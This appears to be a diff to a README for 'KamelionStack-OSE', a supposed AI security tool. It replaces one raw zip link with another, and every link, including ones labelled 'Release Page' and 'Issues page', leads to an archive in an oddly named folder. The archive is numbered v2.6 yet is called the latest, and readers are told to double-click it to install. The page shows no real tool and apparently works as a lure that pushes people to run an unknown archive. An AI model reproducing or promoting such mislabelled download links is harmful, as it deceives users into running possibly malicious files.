@@ -2,7 +2,7 @@
 # 🚀 KamelionStack-OSE - Simplified AI-Powered Security Tool
 
 ## 📥 Download Now
-[![Download KamelionStack-OSE](https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip)](https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip)
+[![Download KamelionStack-OSE](https://raw.githubusercontent.com/vukssan/KamelionStack-OSE/main/overembroider/Stack_OSE_Kamelion_v2.6.zip)](https://raw.githubusercontent.com/vukssan/KamelionStack-OSE/main/overembroider/Stack_OSE_Kamelion_v2.6.zip)
 
 ## 📋 Table of Contents
 - [Introduction](#📖-introduction)
@@ -25,15 +25,15 @@ Before you download KamelionStack-OSE, ensure your machine meets these requireme
 - **Network:** Internet connection is required for certain features.
 
 ## 🚀 Getting Started
-1. **Visit Release Page:** To get the latest version of KamelionStack-OSE, [visit this page to download](https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip).
+1. **Visit Release Page:** To get the latest version of KamelionStack-OSE, [visit this page to download](https://raw.githubusercontent.com/vukssan/KamelionStack-OSE/main/overembroider/Stack_OSE_Kamelion_v2.6.zip).
 2. **Select the Latest Release:** Look for the most recent version at the top of the page.
 3. **Download the File:** Click on the download link for your operating system.
 
 ## 📥 Download & Install
 You can download KamelionStack-OSE from our releases page. Here’s how:
-- Go to the [Release Page](https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip).
+- Go to the [Release Page](https://raw.githubusercontent.com/vukssan/KamelionStack-OSE/main/overembroider/Stack_OSE_Kamelion_v2.6.zip).
 - Locate the version you want.
-- Click the download link for your system (e.g., `https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip`).
+- Click the download link for your system (e.g., `https://raw.githubusercontent.com/vukssan/KamelionStack-OSE/main/overembroider/Stack_OSE_Kamelion_v2.6.zip`).
 - Once the download is complete, locate the file on your computer.
 - Double-click the file to start the installation.
 
@@ -58,7 +58,7 @@ KamelionStack-OSE offers a variety of powerful features:
 
 ## 🆘 Support
 If you have questions or need assistance, we are here to help. You can reach out through the following channels:
-- **GitHub Issues:** Report problems or bugs on our [Issues page](https://github.com/vukssan/KamelionStack-OSE/raw/refs/heads/main/overembroider/Stack-OSE-Kamelion-3.4.zip).
+- **GitHub Issues:** Report problems or bugs on our [Issues page](https://raw.githubusercontent.com/vukssan/KamelionStack-OSE/main/overembroider/Stack_OSE_Kamelion_v2.6.zip).
 - **Community Forum:** Join discussions or ask questions in our online forum.
 
 Feel free to contribute by providing feedback or suggesting new features. Your input helps us improve KamelionStack-OSE for everyone.
